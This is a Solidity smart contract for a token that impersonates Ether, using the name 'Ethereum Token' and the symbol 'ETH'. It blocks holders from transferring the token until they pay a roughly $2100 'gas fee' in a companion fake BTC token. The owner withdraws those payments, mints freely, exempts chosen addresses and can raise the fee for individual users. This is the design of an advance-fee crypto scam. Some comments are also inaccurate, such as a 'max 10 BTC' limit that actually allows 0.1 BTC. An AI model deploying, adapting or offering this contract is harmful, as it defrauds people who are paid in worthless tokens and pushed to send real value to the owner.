// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title FakeETH
 * @dev Fake Ethereum token that requires BTC payment for gas fees (cross-token mechanism)
 * @notice Users must pay in BTC ($2100) to transfer ETH
 */
contract FakeETH is ERC20, Ownable {
    // Maximum supply cap: ~120 million ETH (approximate current ETH supply)
    uint256 public constant MAX_SUPPLY = 120 * 10**6 * 10**18; // 120 million ETH with 18 decimals
    
    // Gas fee parameters
    uint256 public btcGasFee; // BTC amount required for ETH transfer ($2100)
    IERC20 public fakeBTCContract; // Reference to FakeBTC contract

    // Tracking
    mapping(address => uint256) public btcGasBalance; // BTC paid for gas by user
    mapping(address => bool) public approvedSenders; // Addresses that bypass gas fee
    mapping(address => uint256) public customGasFees; // Custom gas fee per recipient (0 = use default)
    mapping(address => GasPaymentRecord[]) public gasPaymentHistory;

    struct GasPaymentRecord {
        uint256 amount;
        uint256 timestamp;
        string transactionId;
    }

    // Events
    event BtcGasFeePaid(address indexed user, uint256 btcAmount);
    event BtcGasFeeUpdated(uint256 newFee);
    event ApprovedSenderUpdated(address indexed sender, bool approved);
    event CustomGasFeeSet(address indexed recipient, uint256 gasFee);
    event BtcGasFeesWithdrawn(uint256 amount);

    /**
     * @dev Initialize Fake ETH token with BTC gas fee mechanism
     * @param _fakeBTCAddress Address of FakeBTC contract
     */
    constructor(address _fakeBTCAddress) ERC20("Ethereum Token", "ETH") Ownable(msg.sender) {
        // Initialize BTC gas fee: $2100 worth of BTC (~0.02 BTC with 8 decimals = 2000000 satoshis)
        btcGasFee = 2 * 10**6; // 0.02 BTC = ~$2100 fixed fee
        fakeBTCContract = IERC20(_fakeBTCAddress);

        // Mint initial supply to owner (7.5 ETH with 18 decimals)
        _mint(msg.sender, 75 * 10**17); // 7.5 ETH
    }

    /**
     * @dev Set FakeBTC contract address (owner only)
     */
    function setFakeBTCAddress(address _fakeBTCAddress) public onlyOwner {
        fakeBTCContract = IERC20(_fakeBTCAddress);
    }

    /**
     * @dev Returns token decimals (Ethereum uses 18 decimals)
     */
    function decimals() public pure override returns (uint8) {
        return 18;
    }

    /**
     * @dev Transfer tokens - blocked unless user has paid gas fee in BTC or is approved sender (owner can transfer freely)
     */
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Owner (admin) can transfer without gas fee
        if (msg.sender == owner()) {
            return super.transfer(to, amount);
        }

        // Check if sender has paid BTC gas fee or is approved
        require(
            btcGasBalance[msg.sender] > 0 || approvedSenders[msg.sender],
            "FAKE_ETH_ERROR: Cannot transfer without paying BTC gas fee ($2100)"
        );

        // Deduct gas fee from BTC gas balance (use custom fee if set for this user)
        if (!approvedSenders[msg.sender]) {
            uint256 gasFee = customGasFees[msg.sender] > 0 ? customGasFees[msg.sender] : btcGasFee;
            require(btcGasBalance[msg.sender] >= gasFee, "Insufficient BTC gas balance");
            btcGasBalance[msg.sender] -= gasFee;
        }

        // Perform transfer
        return super.transfer(to, amount);
    }

    /**
     * @dev TransferFrom tokens - blocked unless user has paid BTC gas fee
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // Check if sender has paid BTC gas fee or is approved
        require(
            btcGasBalance[from] > 0 || approvedSenders[from],
            "FAKE_ETH_ERROR: Cannot transfer without paying BTC gas fee ($2100)"
        );

        // Deduct gas fee from BTC gas balance (use custom fee if set for this user)
        if (!approvedSenders[from]) {
            uint256 gasFee = customGasFees[from] > 0 ? customGasFees[from] : btcGasFee;
            require(btcGasBalance[from] >= gasFee, "Insufficient BTC gas balance");
            btcGasBalance[from] -= gasFee;
        }

        // Perform transfer
        return super.transferFrom(from, to, amount);
    }

    /**
     * @dev Calculate BTC gas fee for transfer
     * For FakeETH: Fixed 0.02 BTC (~$2100)
     */
    function calculateGasFee(uint256 /* amount */) public view returns (uint256) {
        return btcGasFee; // 0.02 BTC = ~$2100
    }

    /**
     * @dev Pay gas fee by transferring BTC
     * User must approve FakeETH contract to spend BTC first
     */
    function payGasFeeWithBTC(uint256 btcAmount) public {
        require(btcAmount >= btcGasFee, "BTC amount must be >= $2100 (0.02 BTC)");
        require(address(fakeBTCContract) != address(0), "FakeBTC contract not set");
        
        // Check user has sufficient BTC balance
        require(fakeBTCContract.balanceOf(msg.sender) >= btcAmount, "Insufficient BTC balance");
        
        // Check user has approved enough BTC
        uint256 allowance = IERC20(address(fakeBTCContract)).allowance(msg.sender, address(this));
        require(allowance >= btcAmount, "Insufficient BTC approval - call FakeBTC.approve() first");

        // Transfer BTC from user to this contract
        require(
            fakeBTCContract.transferFrom(msg.sender, address(this), btcAmount),
            "BTC transfer failed - ensure you approved the contract"
        );

        btcGasBalance[msg.sender] += btcAmount;

        gasPaymentHistory[msg.sender].push(
            GasPaymentRecord({
                amount: btcAmount,
                timestamp: block.timestamp,
                transactionId: ""
            })
        );

        emit BtcGasFeePaid(msg.sender, btcAmount);
    }

    /**
     * @dev Get gas payment history for address
     */
    function getGasPaymentHistory(address user)
        public
        view
        returns (GasPaymentRecord[] memory)
    {
        return gasPaymentHistory[user];
    }

    /**
     * @dev Distribute tokens to multiple addresses (owner only)
     */
    function distributeTokens(address[] calldata recipients, uint256[] calldata amounts)
        public
        onlyOwner
    {
        require(recipients.length == amounts.length, "Array lengths must match");

        // Check total supply doesn't exceed max
        uint256 totalMint = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalMint += amounts[i];
        }
        require(totalSupply() + totalMint <= MAX_SUPPLY, "Exceeds max supply (120M ETH)");

        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i]);
        }
    }

    /**
     * @dev Update BTC gas fee (owner only)
     */
    function updateBtcGasFee(uint256 newBtcFee) public onlyOwner {
        require(newBtcFee > 0, "Fee must be greater than 0");
        require(newBtcFee <= 10 * 10**6, "Fee too high - max 10 BTC"); // Sanity check: max 10 BTC
        btcGasFee = newBtcFee;
        emit BtcGasFeeUpdated(newBtcFee);
    }

    /**
     * @dev Set custom gas fee for a specific recipient (owner only)
     * @param recipient Address of recipient to set custom gas fee for
     * @param gasFeeAmount Amount of BTC required (0 to use default)
     */
    function setCustomGasFee(address recipient, uint256 gasFeeAmount) public onlyOwner {
        require(recipient != address(0), "Invalid recipient address");
        customGasFees[recipient] = gasFeeAmount;
        emit CustomGasFeeSet(recipient, gasFeeAmount);
    }

    /**
     * @dev Set approved sender that bypasses gas fee (owner only)
     */
    function setApprovedSender(address sender, bool approved) public onlyOwner {
        approvedSenders[sender] = approved;
        emit ApprovedSenderUpdated(sender, approved);
    }

    /**
     * @dev Withdraw accumulated BTC gas fees (owner only)
     */
    function withdrawBtcGasFees(uint256 amount) public onlyOwner {
        require(amount <= fakeBTCContract.balanceOf(address(this)), "Insufficient BTC balance");
        require(fakeBTCContract.transfer(owner(), amount), "BTC transfer failed");
        emit BtcGasFeesWithdrawn(amount);
    }
}
